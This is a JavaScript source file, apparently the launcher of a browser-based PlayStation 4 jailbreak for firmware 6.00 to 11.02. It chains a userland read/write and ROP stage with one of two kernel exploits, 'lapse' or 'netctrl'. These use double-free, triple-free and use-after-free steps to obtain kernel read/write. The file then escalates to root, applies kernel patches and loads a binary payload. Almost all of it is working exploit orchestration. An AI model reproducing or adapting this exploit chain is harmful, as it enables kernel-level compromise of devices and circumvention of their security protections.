var cssLoadedScripts = Object.create(null);
var cssJailbreakStarted = false;

function load_script(src) {
    if (cssLoadedScripts[src]) return cssLoadedScripts[src];
    cssLoadedScripts[src] = new Promise(function (resolve, reject) {
        var script = document.createElement('script');
        var settled = false;
        var timeout = setTimeout(function () {
            if (settled) return;
            settled = true;
            delete cssLoadedScripts[src];
            reject(new Error('Timed out loading ' + src));
        }, 20000);
        script.src = src;
        script.async = false;
        script.onload = function () {
            if (settled) return;
            settled = true;
            clearTimeout(timeout);
            resolve();
        };
        script.onerror = function () {
            if (settled) return;
            settled = true;
            clearTimeout(timeout);
            delete cssLoadedScripts[src];
            reject(new Error('Failed to load ' + src));
        };
        document.head.appendChild(script);
    });
    return cssLoadedScripts[src];
}

async function fetch_binary(url) {
    var response = await fetch(url);
    if (response.status < 200 || response.status >= 300) {
        throw new Error('Failed to fetch ' + url + ' (HTTP ' + response.status + ')');
    }
    var buffer = await response.arrayBuffer();
    if (!buffer || buffer.byteLength === 0) throw new Error('Downloaded file is empty: ' + url);
    return new Uint8Array(buffer);
}

function report_boot_error(error) {
    var message = error && error.message ? error.message : String(error);
    var stack = error && error.stack ? error.stack : '';
    if (typeof logger !== 'undefined' && logger && typeof logger.error === 'function') {
        logger.error(message);
        if (stack) logger.error(stack);
        return;
    }
    var output = document.getElementById('console');
    if (output) output.textContent += '\n[-] ' + message + (stack ? '\n' + stack : '');
}

async function doJb() {
    if (cssJailbreakStarted) throw new Error('Jailbreak already started. Reload before retrying.');
    cssJailbreakStarted = true;
    try {
        await load_script('src/misc.js');
        version.init();
        if (version.console !== 4) throw new Error('Only PlayStation 4 is supported.');
        if (version.major < 6 || version.major > 11 || (version.major === 11 && version.minor > 0x02)) {
            throw new Error('Unsupported PS4 firmware ' + version.toString() + '. Expected 6.00-11.02.');
        }
        if (exploitChain !== 'lapse' && exploitChain !== 'netctrl') exploitChain = 'lapse';
        await load_script('src/ps4/constants.js');
        await load_script('src/ps4/userland.js');
        logger.info('===USERLAND===');
        var rw;
        if (arw.master === undefined) rw = await init_rw();
        init_arw(rw);
        init_rop();
        init_syscalls();
        logger.info('===END===');
        await load_script('src/loader.js');
        await load_script('src/workers.js');
        await load_script('src/ps4/kernel.js');
        await load_script('src/' + exploitChain + '.js');
        logger.info('===' + exploitChain.toUpperCase() + '===');
        try {
            if (exploitChain === 'lapse') {
                init(); await setup(); await double_free_reqs2(); leak_kaddrs(); double_free_reqs1(); make_karw(); inc_karw_pipe_refcnt();
                logger.info('Corrupted context cleanup started...');
                remove_pktinfo_from_so(pktopts_twins[0]);
                remove_rthdr_from_so(pktopts_twins[1]);
                remove_rthdr_from_so(rthdr_twins[0]);
                logger.info('Corrupted context cleanup completed !!');
            } else {
                init(); await setup(); await ucred_triple_free(); leak_kqueue(); await make_karw(); inc_karw_pipe_refcnt();
                logger.info('Corrupted context cleanup started...');
                for (var i = 0; i < triplets.length; i++) remove_rthdr_from_so(triplets[i]);
                remove_uaf_file();
                logger.info('Corrupted context cleanup completed !!');
            }
        } finally { cleanup(); }
        find_all_proc();
        if (fn.setuid.invoke(0) === -1) {
            jailbreak();
            var kpatches = await fetch_binary('src/ps4/patches/' + constants.KPATCH);
            kernel_patches(kpatches);
            var payload = await fetch_binary('src/payload.bin');
            load_bin(payload);
        } else {
            logger.info('Jailbreak already active; kernel patch was not applied again.');
        }
        logger.info('===END===');
        return true;
    } catch (error) {
        report_boot_error(error);
        throw error;
    }
}
